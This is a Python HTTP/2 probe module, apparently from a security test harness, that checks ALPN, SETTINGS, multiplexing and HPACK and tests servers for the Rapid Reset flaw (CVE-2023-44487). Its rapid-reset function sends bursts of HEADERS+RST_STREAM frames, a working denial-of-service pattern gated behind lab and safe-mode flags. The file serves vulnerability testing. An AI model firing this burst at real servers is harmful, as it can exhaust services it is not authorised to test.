#!/usr/bin/env python3
# HARNESS-VALIDATION v3.1.0 — http2_probe (telecom protocol module)
# HTTP/2 (RFC 7540 / RFC 9113) probe with TLS ALPN and h2c upgrade.
#
# HTTP/2 is the binary, multiplexed transport underlying gRPC, RESTCONF,
# Kubernetes API, 5G SBI. Port 443 with TLS ALPN(h2) or port 80 with h2c
# upgrade.
#
# Tests:
#   1. TLS ALPN negotiation       → h2_negotiated
#   2. HTTP/2 preface + SETTINGS  → settings_received
#   3. Server accepts HTTP/2      → streams_supported (open a stream)
#   4. Stream multiplexing         → 3 parallel HEADERS, check all answered
#   5. CVE-2023-44487 Rapid Reset → rapid_reset_vulnerable
#      (send N=50 HEADERS+RST_STREAM; vulnerable if server doesn't GOAWAY)
#   6. HPACK header compression   → SETTINGS_HEADER_TABLE_SIZE advertised
#      and a single HEADERS frame accepted
#   7. Read MAX_CONCURRENT_STREAMS from server SETTINGS → max_streams
#
# HTTP/2 frame format (RFC 7540 §4.1):
#   Length(24 bits) + Type(8) + Flags(8) + R(1)+StreamID(31) + Payload
#
# Connection preface (RFC 7540 §3.5): client MUST send first 24 bytes:
#   "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + SETTINGS frame
#
# CVE-2023-44487 (Rapid Reset): client opens a stream with HEADERS+END_STREAM,
# then immediately sends RST_STREAM. Repeated rapidly → server CPU
# exhaustion. RFC 9113 §5.1.2 mitigation: server must enforce limits on
# the rate of stream resets (default 200 streams/min or GOAWAY with
# ENHANCE_YOUR_CALM error code = 0x0B).
#
# CLI:
#   python3 http2_probe.py [host] [port]
#       host default = 127.0.0.1
#       port default = 443
#
# Output: single JSON object on stdout.
#
# Legal: Rapid Reset is a DoS vector — only run against lab servers.
import json
import os
import random
import socket
import ssl
import struct
import sys
import time
from typing import Dict, List, Optional, Tuple

# ─── Make sector_base importable from ../../sector_base.py ────────────────────
_HERE = os.path.dirname(os.path.abspath(__file__))
_MODULES_ROOT = os.path.dirname(os.path.dirname(_HERE))
if _MODULES_ROOT not in sys.path:
    sys.path.insert(0, _MODULES_ROOT)

try:
    from sector_base import get_sector_config  # noqa: E402
    _SECTOR_BASE_OK = True
except Exception:  # noqa: BLE001
    _SECTOR_BASE_OK = False

    def get_sector_config() -> Dict:  # type: ignore[no-redef]
        return {"sector": "telecom", "safe_mode": "read_only"}

HARNESS_VERSION = "3.1.0"
MODULE_NAME = "http2_probe"
TIMEOUT_S = 5  # 5 s hard cap on every socket op

# ─── CLI args ─────────────────────────────────────────────────────────────────
HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
try:
    PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 443
except ValueError:
    PORT = 443

# SAFE_MODE: read_only = no rapid-reset test (default), full = enable test
SAFE_MODE = os.environ.get("SAFE_MODE", "read_only")

# ─── SEED reproducibility ─────────────────────────────────────────────────────
SEED = int(os.environ.get("SEED", "1337"))
_rng = random.Random(SEED)

# ─── LAB guard ────────────────────────────────────────────────────────────────
def lab_guard() -> bool:
    return os.environ.get("LAB") == "1"


# ═══════════════════════════════════════════════════════════════════════════
#  Constants
# ═══════════════════════════════════════════════════════════════════════════
H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

# Frame types (RFC 7540 §6)
FRAME_DATA = 0x0
FRAME_HEADERS = 0x1
FRAME_PRIORITY = 0x2
FRAME_RST_STREAM = 0x3
FRAME_SETTINGS = 0x4
FRAME_PUSH_PROMISE = 0x5
FRAME_PING = 0x6
FRAME_GOAWAY = 0x7
FRAME_WINDOW_UPDATE = 0x8
FRAME_CONTINUATION = 0x9

# Frame flags
FLAG_ACK = 0x1
FLAG_END_STREAM = 0x1
FLAG_END_HEADERS = 0x4
FLAG_PADDED = 0x8
FLAG_PRIORITY = 0x20

# SETTINGS identifiers
SETTINGS_HEADER_TABLE_SIZE = 0x1
SETTINGS_ENABLE_PUSH = 0x2
SETTINGS_MAX_CONCURRENT_STREAMS = 0x3
SETTINGS_INITIAL_WINDOW_SIZE = 0x4
SETTINGS_MAX_FRAME_SIZE = 0x5
SETTINGS_MAX_HEADER_LIST_SIZE = 0x6

# GOAWAY error codes (RFC 7540 §7)
GOAWAY_NO_ERROR = 0x0
GOAWAY_PROTOCOL_ERROR = 0x1
GOAWAY_INTERNAL_ERROR = 0x2
GOAWAY_FLOW_CONTROL_ERROR = 0x3
GOAWAY_SETTINGS_TIMEOUT = 0x4
GOAWAY_STREAM_CLOSED = 0x5
GOAWAY_FRAME_SIZE_ERROR = 0x6
GOAWAY_REFUSED_STREAM = 0x7
GOAWAY_CANCEL = 0x8
GOAWAY_COMPRESSION_ERROR = 0x9
GOAWAY_CONNECT_ERROR = 0xA
GOAWAY_ENHANCE_YOUR_CALM = 0xB
GOAWAY_INADEQUATE_SECURITY = 0xC
GOAWAY_HTTP_1_1_REQUIRED = 0xD

GOAWAY_ERROR_NAMES = {
    GOAWAY_NO_ERROR: "NO_ERROR",
    GOAWAY_PROTOCOL_ERROR: "PROTOCOL_ERROR",
    GOAWAY_INTERNAL_ERROR: "INTERNAL_ERROR",
    GOAWAY_FLOW_CONTROL_ERROR: "FLOW_CONTROL_ERROR",
    GOAWAY_SETTINGS_TIMEOUT: "SETTINGS_TIMEOUT",
    GOAWAY_STREAM_CLOSED: "STREAM_CLOSED",
    GOAWAY_FRAME_SIZE_ERROR: "FRAME_SIZE_ERROR",
    GOAWAY_REFUSED_STREAM: "REFUSED_STREAM",
    GOAWAY_CANCEL: "CANCEL",
    GOAWAY_COMPRESSION_ERROR: "COMPRESSION_ERROR",
    GOAWAY_CONNECT_ERROR: "CONNECT_ERROR",
    GOAWAY_ENHANCE_YOUR_CALM: "ENHANCE_YOUR_CALM",
    GOAWAY_INADEQUATE_SECURITY: "INADEQUATE_SECURITY",
    GOAWAY_HTTP_1_1_REQUIRED: "HTTP_1_1_REQUIRED",
}

# Rapid Reset test parameters (CVE-2023-44487)
RR_STREAM_COUNT = 50       # number of HEADERS+RST_STREAM cycles
RR_PERMITTED_RESETS = 100  # RFC 9113 default limit


# ═══════════════════════════════════════════════════════════════════════════
#  Socket helpers
# ═══════════════════════════════════════════════════════════════════════════
def _set_sock_timeout(sock: socket.socket, seconds: float = TIMEOUT_S) -> None:
    try:
        if hasattr(socket, "SO_RCVTIMEO"):
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO,
                            struct.pack("ll", int(seconds),
                                        int((seconds % 1) * 1_000_000)))
        if hasattr(socket, "SO_SNDTIMEO"):
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO,
                            struct.pack("ll", int(seconds),
                                        int((seconds % 1) * 1_000_000)))
    except OSError:
        pass
    sock.settimeout(seconds)


# ═══════════════════════════════════════════════════════════════════════════
#  HTTP/2 frame building (RFC 7540 §4)
# ═══════════════════════════════════════════════════════════════════════════
def build_frame(frame_type: int, flags: int, stream_id: int,
                payload: bytes) -> bytes:
    """Build an HTTP/2 frame: Length(3) + Type(1) + Flags(1) + R+StreamID(4)."""
    length = len(payload)
    if length > 0xFFFFFF:
        raise ValueError("payload too large")
    sid = stream_id & 0x7FFFFFFF
    header = (length.to_bytes(3, "big") +
              bytes([frame_type & 0xFF, flags & 0xFF]) +
              struct.pack(">I", sid))
    return header + payload


def build_settings_frame(settings: Optional[List[Tuple[int, int]]] = None,
                         ack: bool = False) -> bytes:
    if ack:
        return build_frame(FRAME_SETTINGS, FLAG_ACK, 0, b"")
    payload = b""
    for sid, val in (settings or []):
        payload += struct.pack(">HI", sid, val)
    return build_frame(FRAME_SETTINGS, 0, 0, payload)


def build_ping_frame(opaque: bytes = b"harness1", ack: bool = False) -> bytes:
    if len(opaque) != 8:
        opaque = (opaque + b"\x00" * 8)[:8]
    return build_frame(FRAME_PING, FLAG_ACK if ack else 0, 0, opaque)


def build_window_update(stream_id: int, increment: int) -> bytes:
    payload = struct.pack(">I", increment & 0x7FFFFFFF)
    return build_frame(FRAME_WINDOW_UPDATE, 0, stream_id, payload)


def build_headers_frame(stream_id: int, header_block: bytes,
                        end_stream: bool = False,
                        end_headers: bool = True) -> bytes:
    flags = 0
    if end_stream:
        flags |= FLAG_END_STREAM
    if end_headers:
        flags |= FLAG_END_HEADERS
    return build_frame(FRAME_HEADERS, flags, stream_id, header_block)


def build_rst_stream(stream_id: int, error_code: int = 0x8) -> bytes:
    """Build a RST_STREAM frame (RFC 7540 §6.4). CANCEL = 0x8."""
    payload = struct.pack(">I", error_code & 0xFFFFFFFF)
    return build_frame(FRAME_RST_STREAM, 0, stream_id, payload)


def build_goaway_frame(last_stream_id: int, error_code: int,
                       debug_data: bytes = b"") -> bytes:
    payload = (struct.pack(">II", last_stream_id & 0x7FFFFFFF,
                           error_code & 0xFFFFFFFF) + debug_data)
    return build_frame(FRAME_GOAWAY, 0, 0, payload)


# ═══════════════════════════════════════════════════════════════════════════
#  HPACK (RFC 7541) — minimal literal encoding
# ═══════════════════════════════════════════════════════════════════════════
def _hpack_int(value: int, prefix_bits: int, prefix_byte: int = 0) -> bytes:
    max_val = (1 << prefix_bits) - 1
    if value < max_val:
        return bytes([prefix_byte | value])
    out = bytes([prefix_byte | max_val])
    value -= max_val
    while value >= 128:
        out += bytes([0x80 | (value & 0x7F)])
        value >>= 7
    out += bytes([value & 0x7F])
    return out


def hpack_literal(name: str, value: str, never_index: bool = False) -> bytes:
    """Literal-without-indexing (RFC 7541 §6.2.2)."""
    prefix = 0x10 if never_index else 0x00
    name_b = name.encode("ascii")
    value_b = value.encode("ascii")
    out = bytes([prefix])
    out += _hpack_int(len(name_b), 7, 0x00)
    out += name_b
    out += _hpack_int(len(value_b), 7, 0x00)
    out += value_b
    return out


def build_get_header_block(host: str, port: int,
                           path: str = "/") -> bytes:
    """Build HPACK header block for a GET request."""
    authority = f"{host}:{port}" if port not in (80, 443) else host
    block = b""
    block += hpack_literal(":method", "GET", never_index=True)
    block += hpack_literal(":scheme", "https", never_index=True)
    block += hpack_literal(":path", path, never_index=True)
    block += hpack_literal(":authority", authority, never_index=True)
    block += hpack_literal("user-agent",
                           f"harness/{HARNESS_VERSION} ({MODULE_NAME})")
    block += hpack_literal("accept", "*/*")
    return block


# ═══════════════════════════════════════════════════════════════════════════
#  HTTP/2 frame parsing
# ═══════════════════════════════════════════════════════════════════════════
def parse_frames(data: bytes) -> List[Dict]:
    frames: List[Dict] = []
    pos = 0
    while pos + 9 <= len(data):
        length = int.from_bytes(data[pos:pos + 3], "big")
        ftype = data[pos + 3]
        flags = data[pos + 4]
        stream_id = struct.unpack(">I", data[pos + 5:pos + 9])[0] & 0x7FFFFFFF
        payload_start = pos + 9
        payload_end = payload_start + length
        if payload_end > len(data):
            break
        payload = data[payload_start:payload_end]
        frames.append({
            "type": ftype,
            "flags": flags,
            "stream_id": stream_id,
            "payload": payload,
            "raw": data[pos:payload_end],
        })
        pos = payload_end
    return frames


def parse_settings(payload: bytes) -> Dict[int, int]:
    out: Dict[int, int] = {}
    for i in range(0, len(payload) - 5, 6):
        sid, val = struct.unpack(">HI", payload[i:i + 6])
        out[sid] = val
    return out


def parse_goaway(payload: bytes) -> Tuple[int, int, str]:
    """Parse GOAWAY payload: last_stream_id(4) + error_code(4) + debug(remaining).
    Returns (last_stream_id, error_code, debug_text)."""
    if len(payload) < 8:
        return (0, 0, "")
    last_sid = struct.unpack(">I", payload[0:4])[0] & 0x7FFFFFFF
    err_code = struct.unpack(">I", payload[4:8])[0]
    debug = payload[8:].decode("utf-8", errors="replace")
    return (last_sid, err_code, debug)


# ═══════════════════════════════════════════════════════════════════════════
#  Connection setup with TLS ALPN
# ═══════════════════════════════════════════════════════════════════════════
def open_h2(host: str, port: int) -> Tuple[Optional[object], Optional[str], str]:
    """Open TCP+TLS(h2 ALPN) or plaintext connection. Returns
    (socket_obj, alpn_or_None, error_str)."""
    sock = None
    ssock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _set_sock_timeout(sock, TIMEOUT_S)
        sock.connect((host, port))
        if port in (443, 8443) or os.environ.get("HTTP2_TLS", "1") == "1":
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try:
                ctx.set_alpn_protocols(["h2", "http/1.1"])
            except (NotImplementedError, AttributeError):
                pass
            try:
                ssock = ctx.wrap_socket(sock, server_hostname=host)
                alpn = ssock.selected_alpn_protocol()
                # If ALPN negotiated http/1.1 only, we still try h2 preface
                # (some servers do h2c upgrade over TLS — rare but possible)
                return ssock, alpn, ""
            except (ssl.SSLError, OSError) as e:
                # Fall back to plaintext h2c
                try:
                    sock.close()
                except Exception:  # noqa: BLE001
                    pass
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                _set_sock_timeout(sock, TIMEOUT_S)
                sock.connect((host, port))
                return sock, None, ""
        return sock, None, ""
    except (ConnectionRefusedError, OSError) as e:
        for s in (ssock, sock):
            if s is not None:
                try:
                    s.close()
                except Exception:  # noqa: BLE001
                    pass
        return None, None, f"{type(e).__name__}:{e}"
    except Exception as e:  # noqa: BLE001
        for s in (ssock, sock):
            if s is not None:
                try:
                    s.close()
                except Exception:  # noqa: BLE001
                    pass
        return None, None, f"{type(e).__name__}:{e}"


# ═══════════════════════════════════════════════════════════════════════════
#  Test 1+2+3: TLS ALPN + HTTP/2 handshake + SETTINGS
# ═══════════════════════════════════════════════════════════════════════════
def test_h2_handshake(host: str, port: int,
                      results: List[Dict]) -> Tuple[bool, Optional[object],
                                                    Optional[str], Dict[int, int]]:
    """Open TLS(h2) or plaintext, send preface+SETTINGS, read SETTINGS back.
    Returns (settings_received, socket, alpn, server_settings)."""
    io_sock, alpn, err = open_h2(host, port)
    if io_sock is None:
        results.append({"test": "h2_handshake",
                        "verdict": "no_connection",
                        "error": err})
        return False, None, None, {}
    h2_negotiated = (alpn == "h2")
    # Send preface + SETTINGS
    preface = H2_PREFACE + build_settings_frame([
        (SETTINGS_HEADER_TABLE_SIZE, 4096),
        (SETTINGS_ENABLE_PUSH, 0),
        (SETTINGS_MAX_CONCURRENT_STREAMS, 100),
        (SETTINGS_INITIAL_WINDOW_SIZE, 65535),
        (SETTINGS_MAX_FRAME_SIZE, 16384),
    ])
    try:
        io_sock.sendall(preface)
        data = io_sock.recv(4096)
    except (socket.timeout, TimeoutError, OSError) as e:
        results.append({"test": "h2_handshake",
                        "verdict": "no_response",
                        "error": f"{type(e).__name__}",
                        "alpn": alpn})
        try:
            io_sock.close()
        except Exception:  # noqa: BLE001
            pass
        return False, None, alpn, {}
    if not data:
        results.append({"test": "h2_handshake",
                        "verdict": "no_response",
                        "alpn": alpn})
        try:
            io_sock.close()
        except Exception:  # noqa: BLE001
            pass
        return False, None, alpn, {}
    frames = parse_frames(data)
    has_settings = any(f["type"] == FRAME_SETTINGS and
                       not (f["flags"] & FLAG_ACK) for f in frames)
    server_settings: Dict[int, int] = {}
    for f in frames:
        if f["type"] == FRAME_SETTINGS and not (f["flags"] & FLAG_ACK):
            server_settings = parse_settings(f["payload"])
            break
    # Send SETTINGS ACK
    try:
        io_sock.sendall(build_settings_frame(ack=True))
    except OSError:
        pass
    # Send PING for liveness confirmation
    ping_payload = b"harness2"
    try:
        io_sock.sendall(build_ping_frame(ping_payload))
        ping_resp = io_sock.recv(4096)
        ping_frames = parse_frames(ping_resp) if ping_resp else []
        ping_acked = any(f["type"] == FRAME_PING and (f["flags"] & FLAG_ACK)
                         and f["payload"] == ping_payload for f in ping_frames)
    except (socket.timeout, TimeoutError, OSError):
        ping_acked = False
    results.append({
        "test": "h2_handshake",
        "verdict": "h2_up" if has_settings else "preface_only",
        "alpn": alpn,
        "h2_negotiated": h2_negotiated,
        "settings_received": has_settings,
        "ping_acked": ping_acked,
        "server_settings": server_settings,
    })
    return has_settings, io_sock, alpn, server_settings


# ═══════════════════════════════════════════════════════════════════════════
#  Test 4: Stream multiplexing (3 parallel GETs)
# ═══════════════════════════════════════════════════════════════════════════
def test_stream_multiplexing(host: str, port: int, io_sock: object,
                             results: List[Dict]) -> bool:
    """Open 3 streams (id=1, 3, 5) with GET / and check that the server
    responds to each. If the server only answers stream 1 (no multiplexing),
    streams_supported=False."""
    stream_ids = [1, 3, 5]
    # Send all 3 HEADERS frames back-to-back
    msg = b""
    for sid in stream_ids:
        block = build_get_header_block(host, port, "/")
        msg += build_headers_frame(sid, block, end_stream=True,
                                   end_headers=True)
    try:
        io_sock.sendall(msg)  # type: ignore[union-attr]
    except OSError as e:
        results.append({"test": "stream_multiplexing",
                        "verdict": "send_error",
                        "error": f"{type(e).__name__}:{e}"})
        return False
    # Read responses (multiple frames may arrive)
    answered = set()
    deadline = time.time() + 3.0
    while time.time() < deadline and len(answered) < len(stream_ids):
        try:
            data = io_sock.recv(8192)  # type: ignore[union-attr]
        except (socket.timeout, TimeoutError):
            break
        except OSError:
            break
        if not data:
            break
        for f in parse_frames(data):
            if f["stream_id"] in stream_ids:
                answered.add(f["stream_id"])
    multiplex_ok = len(answered) >= 2  # at least 2 of 3 answered
    results.append({
        "test": "stream_multiplexing",
        "verdict": "multiplex_ok" if multiplex_ok else "single_stream_only",
        "streams_opened": len(stream_ids),
        "streams_answered": len(answered),
        "answered_ids": sorted(answered),
    })
    return multiplex_ok


# ═══════════════════════════════════════════════════════════════════════════
#  Test 5: CVE-2023-44487 Rapid Reset
# ═══════════════════════════════════════════════════════════════════════════
def test_rapid_reset(host: str, port: int, io_sock: object,
                     results: List[Dict]) -> bool:
    """Rapid Reset test (CVE-2023-44487): send RR_STREAM_COUNT HEADERS+
    END_STREAM frames, each immediately followed by RST_STREAM. A vulnerable
    server keeps accepting streams and never sends GOAWAY ENHANCE_YOUR_CALM.

    SAFE_MODE=read_only: SKIPPED (this is a DoS test).
    SAFE_MODE=full: performs the test with RR_STREAM_COUNT=50 cycles.

    Returns True if server appears vulnerable (no GOAWAY ENHANCE_YOUR_CALM)."""
    if SAFE_MODE != "full":
        results.append({
            "test": "rapid_reset",
            "verdict": "skipped",
            "reason": ("SAFE_MODE != full — Rapid Reset is a DoS test, "
                       "only run on isolated lab servers"),
            "cve": "CVE-2023-44487",
        })
        return False
    # Build RR_STREAM_COUNT HEADERS+RST_STREAM pairs, all on odd stream IDs
    msg = b""
    base_stream = 7  # next odd id after our multiplexing test (1, 3, 5)
    for i in range(RR_STREAM_COUNT):
        sid = base_stream + i * 2
        block = build_get_header_block(host, port, "/")
        msg += build_headers_frame(sid, block, end_stream=True,
                                   end_headers=True)
        msg += build_rst_stream(sid, GOAWAY_CANCEL)
    try:
        io_sock.sendall(msg)  # type: ignore[union-attr]
    except OSError as e:
        results.append({"test": "rapid_reset",
                        "verdict": "send_error",
                        "error": f"{type(e).__name__}:{e}"})
        return False
    # Read responses — look for GOAWAY with ENHANCE_YOUR_CALM (0x0B)
    goaway_seen = False
    goaway_error = None
    goaway_debug = ""
    deadline = time.time() + 3.0
    total_data = b""
    while time.time() < deadline:
        try:
            data = io_sock.recv(8192)  # type: ignore[union-attr]
        except (socket.timeout, TimeoutError):
            break
        except OSError:
            break
        if not data:
            break
        total_data += data
        for f in parse_frames(data):
            if f["type"] == FRAME_GOAWAY:
                last_sid, err_code, debug = parse_goaway(f["payload"])
                goaway_seen = True
                goaway_error = err_code
                goaway_debug = debug
                if err_code == GOAWAY_ENHANCE_YOUR_CALM:
                    break
        if goaway_seen and goaway_error == GOAWAY_ENHANCE_YOUR_CALM:
            break
    vulnerable = not (goaway_seen and goaway_error == GOAWAY_ENHANCE_YOUR_CALM)
    results.append({
        "test": "rapid_reset",
        "verdict": "vulnerable" if vulnerable else "protected",
        "cve": "CVE-2023-44487",
        "rapid_reset_count": RR_STREAM_COUNT,
        "goaway_seen": goaway_seen,
        "goaway_error": GOAWAY_ERROR_NAMES.get(goaway_error, str(goaway_error))
                        if goaway_error is not None else None,
        "goaway_debug": goaway_debug[:128],
        "detail": ("Server did NOT send GOAWAY ENHANCE_YOUR_CALM after "
                   f"{RR_STREAM_COUNT} rapid resets — likely vulnerable to "
                   "CVE-2023-44487")
                   if vulnerable else
                   ("Server sent GOAWAY ENHANCE_YOUR_CALM — Rapid Reset "
                    "mitigation in place (RFC 9113 §5.1.2)"),
    })
    return vulnerable


# ═══════════════════════════════════════════════════════════════════════════
#  Test 6: HPACK header compression behavior
# ═══════════════════════════════════════════════════════════════════════════
def test_hpack_compression(host: str, port: int, io_sock: object,
                           server_settings: Dict[int, int],
                           results: List[Dict]) -> bool:
    """Check if server advertised SETTINGS_HEADER_TABLE_SIZE (HPACK
    dynamic table size). Send a HEADERS frame with literal encoding and
    verify the server accepts it (HEADERS response on the same stream)."""
    hpack_table_size = server_settings.get(SETTINGS_HEADER_TABLE_SIZE, 4096)
    # Send a GET / with HPACK literal headers on stream 65535 (large id)
    sid = 65535
    block = build_get_header_block(host, port, "/")
    try:
        io_sock.sendall(build_headers_frame(sid, block, end_stream=True,
                                            end_headers=True))  # type: ignore[union-attr]
        data = io_sock.recv(4096)  # type: ignore[union-attr]
    except (socket.timeout, TimeoutError, OSError):
        data = b""
    frames = parse_frames(data) if data else []
    answered = any(f["stream_id"] == sid for f in frames)
    results.append({
        "test": "hpack_compression",
        "verdict": "ok" if answered else "no_response",
        "server_header_table_size": hpack_table_size,
        "max_header_list_size": server_settings.get(
            SETTINGS_MAX_HEADER_LIST_SIZE),
        "stream_answered": answered,
    })
    return answered


# ═══════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════
def main() -> None:
    if not lab_guard():
        print(json.dumps({
            "module": MODULE_NAME,
            "harness_version": HARNESS_VERSION,
            "error": "lab_guard_not_satisfied",
            "detail": "Set LAB=1 to confirm isolated lab authorization.",
            "legal_note": ("HTTP/2 Rapid Reset (CVE-2023-44487) is a DoS "
                           "vector. Lab only (FR Art. 323-1 / US 18 USC §1030)."),
        }))
        sys.exit(1)

    t0 = time.time()
    results: List[Dict] = []
    summary: Dict = {
        "module": MODULE_NAME,
        "harness_version": HARNESS_VERSION,
        "target": HOST,
        "http2_port": PORT,
        "sector": get_sector_config().get("sector", "telecom"),
        "safe_mode": SAFE_MODE,
        "read_only": SAFE_MODE != "full",
        "seed": SEED,
        # Spec-required output fields:
        "h2_negotiated": False,
        "settings_received": False,
        "streams_supported": False,
        "rapid_reset_vulnerable": False,
        "max_streams": 0,
        "results": results,
        "errors": [],
    }

    io_sock: Optional[object] = None
    alpn: Optional[str] = None
    server_settings: Dict[int, int] = {}

    # ─── 1+2+3. Handshake ────────────────────────────────────────────────
    try:
        settings_received, io_sock, alpn, server_settings = \
            test_h2_handshake(HOST, PORT, results)
        summary["h2_negotiated"] = (alpn == "h2")
        summary["settings_received"] = settings_received
        summary["max_streams"] = server_settings.get(
            SETTINGS_MAX_CONCURRENT_STREAMS, 0)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"h2_handshake:{type(e).__name__}:{e}")

    if io_sock is None:
        summary["elapsed_ms"] = round((time.time() - t0) * 1000, 1)
        print(json.dumps(summary, indent=2, default=str))
        return

    # ─── 4. Stream multiplexing ──────────────────────────────────────────
    try:
        summary["streams_supported"] = test_stream_multiplexing(
            HOST, PORT, io_sock, results)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"multiplex:{type(e).__name__}:{e}")

    # ─── 5. Rapid Reset (SAFE_MODE=full only) ────────────────────────────
    try:
        summary["rapid_reset_vulnerable"] = test_rapid_reset(
            HOST, PORT, io_sock, results)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"rapid_reset:{type(e).__name__}:{e}")

    # ─── 6. HPACK behavior ───────────────────────────────────────────────
    try:
        test_hpack_compression(HOST, PORT, io_sock, server_settings, results)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"hpack:{type(e).__name__}:{e}")

    # Clean up
    try:
        io_sock.close()  # type: ignore[union-attr]
    except Exception:  # noqa: BLE001
        pass

    summary["elapsed_ms"] = round((time.time() - t0) * 1000, 1)
    print(json.dumps(summary, indent=2, default=str))


if __name__ == "__main__":
    main()
